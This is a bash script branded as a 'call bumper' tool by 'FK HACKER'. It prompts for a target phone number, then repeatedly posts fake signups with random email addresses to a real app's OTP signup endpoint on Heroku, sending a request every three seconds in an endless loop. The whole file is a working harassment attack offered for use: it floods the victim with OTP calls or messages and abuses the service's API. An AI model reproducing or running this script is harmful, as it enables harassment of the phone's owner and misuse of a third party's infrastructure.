#!/bin/bash

# Hacker style banner
banner() {
    clear
    echo -e "\e[1;33m"
    echo " _____ _  __ __  __  ____  _   _ _____ ____  ______   __"
    echo "|  ___| |/ / \ \/ / / ___|| | | | ____|  _ \|  _ \ \ / /"
    echo "| |_  | \' /   \  /  \___ \| |_| |  _| | |_) | |_) \ V / "
    echo "|  _| | . \   /  \   ___) |  _  | |___|  _ <|  _ < | |  "
    echo "|_|   |_|\_\ /_/\_\ |____/|_| |_|_____|_| \_\_| \_\|_|  "
    echo "                                                        "
    echo -e "\e[1;31m       DARK WEB RAIDERS CALL BUMPER TOOL\e[0m"
    echo -e "\e[1;31m[+] Developed by: FK HACKER\e[0m"
    echo -e "\e[1;34m[+] Join my WhatsApp Channel:\e[0m \e[4;36mhttps://whatsapp.com/channel/0029Vb3SOvACMY0N5PlQOO3G"
    echo ""
}

# Generate random email
generate_random_email() {
    head /dev/urandom | tr -dc A-Za-z0-9 | head -c 10 | sed 's/.*/&@gmail.com/'
}

# Graceful exit
cleanup() {
    tput cnorm
    echo -e "\n\e[0;31m[!] Exiting... CTRL+C detected.\e[0m"
    exit 0
}
trap cleanup INT

# Run banner
banner

# User input
read -p $'\033[1;32m[?] Enter phone number (e.g., 0300000000): \033[0m' phone_number
sleep 1

# API URL
API_URL="https://martbackend.herokuapp.com/user/signUpOtp"

# Start bombing loop
while true; do
    random_email=$(generate_random_email)
    JSON_BODY='{"phone":"'"$phone_number"'","email":"'"$random_email"'","name":"ali khan","referralCode":""}'

    echo -e "\n\e[1;36m[+] Sending call request to:\e[0m $phone_number"
    echo -e "\e[1;34m[+] Using email:\e[0m $random_email"

    curl -s -X POST "$API_URL" \
         -H "accept: application/json, text/plain, */*" \
         -H "Content-Type: application/json" \
         -H "User-Agent: okhttp/4.9.2" \
         -d "$JSON_BODY" \
         --compressed

    echo -e "\e[1;32m[✔] Request sent successfully!\e[0m"
    echo -e "\e[1;90m----------------------------------------\e[0m"

    sleep 3

done
